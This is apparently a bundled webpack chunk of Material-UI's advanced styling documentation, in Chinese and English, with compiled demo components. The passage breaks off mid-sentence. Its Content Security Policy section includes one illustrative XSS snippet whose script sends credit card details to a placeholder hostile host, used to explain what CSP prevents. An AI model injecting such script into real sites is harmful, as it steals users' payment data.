_N_E=(window.webpackJsonp_N_E=window.webpackJsonp_N_E||[]).push([[336],{"/+Qa":function(e,n){e.exports="import * as React from 'react';\nimport { ThemeProvider, makeStyles } from '@material-ui/core/styles';\n\nconst themeInstance = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nconst useStyles = makeStyles((theme) => ({\n  root: {\n    background: theme.background,\n    border: 0,\n    fontSize: 16,\n    borderRadius: 3,\n    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n}));\n\nfunction DeepChild() {\n  const classes = useStyles();\n\n  return (\n    <button type=\"button\" className={classes.root}>\n      Theming\n    </button>\n  );\n}\n\nexport default function Theming() {\n  return (\n    <ThemeProvider theme={themeInstance}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n"},"/aAU":function(e,n){e.exports="# \u9ad8\u7ea7\n\n<p class=\"description\">\u672c\u8282\u5305\u542b\u4e86\u66f4\u591a @material-ui/core/styles \u7684\u8fdb\u9636\u7528\u6cd5\u3002</p>\n\n## \u4e3b\u9898\n\n\u6dfb\u52a0` ThemeProvider `\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u9876\u5c42\uff0c\u5c06\u4e3b\u9898\u4f20\u9012\u5230React\u7ec4\u4ef6\u6811\u3002 \u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u5728\u6837\u5f0f\u51fd\u6570\u4e2d\u8bbf\u95ee\u4e3b\u9898\u5bf9\u8c61\u3002\n\n> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### \u8bbf\u95ee\u7ec4\u4ef6\u4e2d\u7684\u4e3b\u9898\n\n\u5728\u7ec4\u4ef6\u4e2d\u8bbf\u95ee @material-ui/styles \u4e3b\u9898\u3002\n\n#### `useTheme` hook\n\n\u7528\u4e8e\u51fd\u6570\u7ec4\u4ef6\uff1a\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### \u4e3b\u9898\u5d4c\u5957\n\n\u60a8\u53ef\u4ee5\u5d4c\u5957\u591a\u4e2a\u4e3b\u9898\u63d0\u4f9b\u8005\u3002 \u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u4e0d\u540c\u533a\u57df\u9700\u8981\u5e94\u7528\u4e0d\u540c\u5916\u89c2\u65f6\uff0c\u8fd9\u975e\u5e38\u6709\u7528\u3002\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\n\u5185\u90e8\u4e3b\u9898\u5c06 **\u8986\u76d6** \u5916\u90e8\u4e3b\u9898\u3002 \u4f60\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u51fd\u6570\u6765\u6269\u5c55\u5916\u90e8\u4e3b\u9898\uff1a\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\n` makeStyles ` (hook generator) \u548c` withStyles ` (HOC) API\u5141\u8bb8\u4e3a\u6bcf\u4e2a\u6837\u5f0f\u8868\u521b\u5efa\u591a\u4e2a\u6837\u5f0f\u89c4\u5219\u3002 \u6bcf\u4e2a\u6837\u5f0f\u89c4\u5219\u90fd\u6709\u81ea\u5df1\u7684\u7c7b\u540d\u3002 \u7c7b\u540d\u901a\u8fc7` classes `\u53d8\u91cf\u4f20\u5165\u7ec4\u4ef6\u3002 \u5728\u4e3a\u7ec4\u4ef6\u4e2d\u7684\u5d4c\u5957\u5143\u7d20\u8bbe\u7f6e\u6837\u5f0f\u65f6\uff0c\u8fd9\u5c24\u5176\u6709\u7528\u3002\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\n\u4f46\u662f\uff0c\u7c7b\u540d\u901a\u5e38\u662f\u4e0d\u786e\u5b9a\u7684\u3002 \u7236\u7ec4\u4ef6\u5982\u4f55\u8986\u76d6\u5d4c\u5957\u5143\u7d20\u7684\u6837\u5f0f\uff1f\n\n### `withStyles`\n\n\u8fd9\u662f\u6700\u7b80\u5355\u7684\u60c5\u51b5\u3002 \u5305\u88c5\u7ec4\u4ef6\u63a5\u53d7` classes ` \u5c5e\u6027\uff0c \u5b83\u7b80\u5355\u5730\u5408\u5e76\u4e86\u6837\u5f0f\u8868\u63d0\u4f9b\u7684\u7c7b\u540d\u3002\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nHook API\u9700\u8981\u591a\u5199\u4e00\u70b9\u6a21\u7248\u4ee3\u7801\u3002 \u60a8\u9700\u8981\u8f6c\u53d1\u7236\u7ea7\u7ec4\u4ef6\u7684\u5c5e\u6027\u5230hook\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS\u4f7f\u7528\u63d2\u4ef6\u6765\u6269\u5c55\u5176\u6838\u5fc3\uff0c\u5141\u8bb8\u60a8\u6311\u9009\u6240\u9700\u7684\u529f\u80fd\uff0c \u5e76\u4e14\u53ea\u4e3a\u60a8\u6b63\u5728\u4f7f\u7528\u7684\u5185\u5bb9\u652f\u4ed8\u6027\u80fd\u5f00\u9500\u3002\n\n\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cMaterial-UI\u4e0d\u4f1a\u542f\u7528\u6240\u6709\u63d2\u4ef6\u3002 \u4ee5\u4e0b\uff08\u5b83\u662f [ jss-preset-default\u7684\u5b50\u96c6](https://cssinjs.org/jss-preset-default/) \uff09 \u88ab\u5305\u542b\u5728\u5185\uff1a\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\n\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u81ea\u7531\u7684\u6dfb\u52a0\u65b0\u63d2\u4ef6\u3002 \u6211\u4eec\u6709\u4e00\u4e2a[](https://github.com/alitaheri/jss-rtl)jss-rtl\u63d2\u4ef6\u7684\u4f8b\u5b50\u3002\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## \u5b57\u7b26\u4e32\u6a21\u677f\n\n\u5982\u679c\u60a8\u66f4\u559c\u6b22CSS\u8bed\u6cd5\u800c\u4e0d\u662fJSS\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528[ jss-plugin-template ](https://cssinjs.org/jss-plugin-template/)\u63d2\u5165\u3002\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\n\u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e0d\u652f\u6301\u9009\u62e9\u5668\u6216\u5d4c\u5957\u89c4\u5219\u3002\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS \u6ce8\u5165\u987a\u5e8f\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\n\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6ce8\u5165\u7684style\u6807\u7b7e\u4f1a\u88ab\u63d2\u5165\u5230\u9875\u9762`<head>`\u5143\u7d20\u7684\u6700\u540e\u3002 \u5b83\u4eec\u6bd4\u9875\u9762\u4e0a\u4efb\u4f55\u5176\u4ed6\u6837\u5f0f\u6807\u7b7e\u66f4\u5177\u7279\u5f02\u6027\uff0c\u4f8b\u5982CSS\u6a21\u5757\uff0c styled components\u3002\n\n### injectFirst\n\n`StylesProvider`\u7ec4\u4ef6\u7684\u5c5e\u6027 `injectFirst` \u4f1a\u628astyle\u6807\u7b7e\u6ce8\u5165\u5230head\u7684**\u524d\u90e8**(\u610f\u5473\u7740\u66f4\u4f4e\u7684\u6743\u91cd)\u3002\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      \u6837\u5f0f\u5316\u7ec4\u4ef6\u53ef\u4ee5\u8986\u76d6 Material-UI \u7684\u6837\u5f0f\u3002 */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\n\u4f7f\u7528 `makeStyles` / `withStyles` / `styled` \u7684\u6ce8\u5165\u987a\u5e8f\u4e8e\u8c03\u7528\u987a\u5e8f**\u76f8\u540c**\u3002 \u4f8b\u5982\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7ea2\u8272\u80dc\u51fa\uff1a\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nHook \u8c03\u7528\u987a\u5e8f\u548c\u7c7b\u540d\u987a\u5e8f**\u4e0d\u5f71\u54cd**\u6ce8\u5165\u5c5e\u6027\u6743\u91cd \u3002\n\n### insertionPoint\n\nJSS [\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point)\u63a7\u5236\u8fd9\u79cd\u60c5\u51b5\u3002 \u901a\u8fc7\u6dfb\u52a0`insertionPoint`\u5230HTML\u4e2d\uff0c\u4f60\u53ef\u4ee5[\u63a7\u5236](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order)\u7ec4\u4ef6\u4e2dCSS\u7684\u63d2\u5165\u4f4d\u7f6e\u3002\n\n#### HTML \u6ce8\u91ca\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n\u521b\u5efa\u751f\u4ea7\u73af\u5883\u65f6, [Create React App](https://github.com/facebook/create-react-app) \u4f1a\u5265\u79bb HTML \u6ce8\u91ca\u3002 To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## \u670d\u52a1\u5668\u7aef\u5448\u73b0\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it\u2019s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### \u9ed8\u8ba4\u503c\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## \u5168\u5c40CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## \u5185\u5bb9\u5b89\u5168\u653f\u7b56\uff08CSP\uff09\n\n### \u4ec0\u4e48\u662fCSP\uff0c\u4e3a\u4ec0\u4e48\u5b83\u6709\u7528\uff1f\n\n\u57fa\u672c\u4e0a\uff0cCSP\u901a\u8fc7\u8981\u6c42\u5f00\u53d1\u4eba\u5458\u5c06\u5176\u8d44\u4ea7\u4ece\u4e2d\u68c0\u7d22\u7684\u6e90\u5217\u5165\u767d\u540d\u5355\u6765\u7f13\u89e3\u8de8\u7ad9\u70b9\u811a\u672c\uff08XSS\uff09\u653b\u51fb\u3002 \u6b64\u5217\u8868\u4f5c\u4e3a\u670d\u52a1\u5668\u7684\u6807\u5934\u8fd4\u56de\u3002 \u4f8b\u5982\uff0c\u5047\u8bbe\u60a8\u6709\u4e00\u4e2a\u6258\u7ba1\u5728` https://example.com`\u7684\u7f51\u7ad9 CSP\u5934`default-src\uff1a'self';`\u5c06\u5141\u8bb8\u4f4d\u4e8e`https://example.com/*`\u7684\u6240\u6709\u8d44\u4ea7\u5e76\u5426\u8ba4\u6240\u6709\u5176\u4ed6\u4eba\u3002 \u5982\u679c\u60a8\u7684\u7f51\u7ad9\u7684\u67d0\u4e2a\u90e8\u5206\u5bb9\u6613\u53d7\u5230XSS\u7684\u5f71\u54cd\u800c\u672a\u663e\u793a\u672a\u8f6c\u4e49\u7684\u7528\u6237\u8f93\u5165\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\n\u6b64\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u4f7f\u7528\u5b89\u5168\u7684CSP\u6807\u5934\uff0c\u6d4f\u89c8\u5668\u5c06\u4e0d\u4f1a\u52a0\u8f7d\u6b64\u811a\u672c\u3002\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### \u5982\u4f55\u5b9e\u73b0CSP\uff1f\n\n\u4e3a\u4e86\u5c06CSP\u4e0eMaterial-UI\uff08\u548cJSS\uff09\u4e00\u8d77\u4f7f\u7528\uff0c\u60a8\u9700\u8981\u4f7f\u7528nonce\u3002 A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS \u6709\u4e00\u4e2a\u5173\u4e8e\u5982\u4f55\u4f7f\u7528 Express \u548c React Helmet \u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\u7684[\u5f88\u68d2\u7684\u6559\u7a0b](https://github.com/cssinjs/jss/blob/master/docs/csp.md)\u3002 \u5bf9\u4e8e\u57fa\u672c\u7eb2\u8981\uff0c\u8bf7\u7ee7\u7eed\u9605\u8bfb\u3002\n\nCSP nonce\u662fBase 64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3002 \u4f60\u53ef\u4ee5\u8fd9\u6837\u751f\u6210\u4e00\u4e2a\uff1a\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. \u7136\u540e\uff0c\u5c06\u6b64\u968f\u673a\u6570\u5e94\u7528\u4e8eCSP\u6807\u5934\u3002 \u5e94\u7528\u4e86\u968f\u673a\u6570\u65f6\uff0cCSP\u6807\u5934\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\n\u7136\u540e\uff0c\u60a8\u5fc5\u987b\u5c06\u6b64\u968f\u673a\u6570\u4f20\u9012\u7ed9JSS\uff0c\u4ee5\u4fbf\u5c06\u5176\u6dfb\u52a0\u5230\u540e\u7eed`<style>`\u6807\u8bb0\u4e2d\u3002\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\n\u65e0\u8bba\u662f\u5426\u4f7f\u7528SSR\uff0c\u90fd\u5fc5\u987b\u5305\u542b\u6b64\u6807\u5934\u3002 Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```"},"005G":function(e,n,t){"use strict";var s=t("z3IF"),o=t("2Fjn"),r=t("mXGw"),i=t.n(r),a=t("GeWT"),l=t.n(a),c=t("mii5"),d=i.a.createElement;var u=function(){var e=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).defaultTheme;return function(n){var t=i.a.forwardRef((function(t,r){var i=t.innerRef,a=Object(o.a)(t,["innerRef"]),l=Object(c.a)()||e;return d(n,Object(s.a)({theme:l,ref:i||r},a))}));return l()(t,n),t}}();n.a=u},"1ZeO":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return m}));var s=t("kGIj"),o=t("mXGw"),r=t("UutA"),i=t("nx5Z"),a=t("WKBU"),l=o.createElement;function c(){var e=Object(s.a)(["\n  label.Mui-focused {\n    color: green;\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red;\n    }\n    &:hover fieldset {\n      border-color: yellow;\n    }\n    &.Mui-focused fieldset {\n      border-color: green;\n    }\n  }\n"]);return c=function(){return e},e}var d=Object(r.b)(i.a)(c()),u=l(a.a,null,l(d,{label:"Deterministic",variant:"outlined",id:"deterministic-outlined-input"}));function m(){return u}},"2FG1":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return d}));var s=t("mXGw"),o=t.n(s),r=t("e+1t"),i=t("kVtE"),a=o.a.createElement,l=t("w5tn"),c=t("IbKh");function d(e){var n=e.demos,t=e.docs;return a(r.a,{demos:n,docs:t,requireDemo:l})}l.keys().map(l),d.getInitialProps=function(){var e=Object(i.a)({pageFilename:"styles/advanced",requireRaw:c});return{demos:e.demos,docs:e.docs}}},"3Biu":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return l}));var s=t("mXGw"),o=t("LMpM"),r=t("h7Hf"),i=s.createElement;var a=i((function(){var e=Object(o.a)();return i("span",null,"spacing ".concat(e.spacing))}),null);function l(){return i(r.a,{theme:{spacing:"8px"}},a)}},"4Tsr":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return p}));var s=t("bZJ2"),o=t("mXGw"),r=t("yZEQ"),i=t("h7Hf"),a=o.createElement,l=Object(r.a)((function(e){return{root:{background:e.background,border:0,fontSize:16,borderRadius:3,boxShadow:e.boxShadow,color:"white",height:48,padding:"0 30px"}}}));function c(){var e=l();return a("button",{type:"button",className:e.root},"Theme nesting")}var d=a(c,null),u=a("br",null),m=a("br",null),h=a(c,null);function p(){return a("div",null,a(i.a,{theme:{background:"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)",boxShadow:"0 3px 5px 2px rgba(255, 105, 135, .3)"}},d,u,m,a(i.a,{theme:function(e){return Object(s.a)(Object(s.a)({},e),{},{background:"linear-gradient(45deg, #2196F3 30%, #21CBF3 90%)",boxShadow:"0 3px 5px 2px rgba(33, 203, 243, .3)"})}},h)))}},"4lnC":function(e,n){e.exports="# Advanced\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/core/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Then, you can access the theme object in style functions.\n\n> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accessing the theme in a component\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\nFor use in function components:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\nFor use in class or function components:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Theme nesting\n\nYou can nest multiple theme providers.\nThis can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nThe inner theme will **override** the outer theme.\nYou can extend the outer theme by providing a function:\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name.\nThe class names are provided to the component with the `classes` variable.\nThis is particularly useful when styling nested elements in a 